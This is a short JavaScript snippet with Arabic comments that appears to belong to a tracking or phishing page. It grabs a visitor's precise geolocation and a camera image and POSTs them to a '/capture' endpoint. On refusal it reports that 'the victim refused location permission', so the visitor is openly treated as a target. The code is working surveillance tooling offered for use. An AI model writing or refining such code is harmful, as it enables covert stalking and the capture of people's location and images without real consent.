navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    
    // تأكد من إرسال الإحداثيات داخل الـ fetch
    fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            location: { lat: lat, lon: lon }, // تأكد أن هذا السطر يرسل lat و lon
            image: await getCameraImage()
        })
    });
}, (err) => {
    // في حال الرفض أرسل رسالة توضح ذلك
    fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ location: "الضحية رفضت إذن الموقع" })
    });
}, { enableHighAccuracy: true }); // لتفعيل الدقة العالية
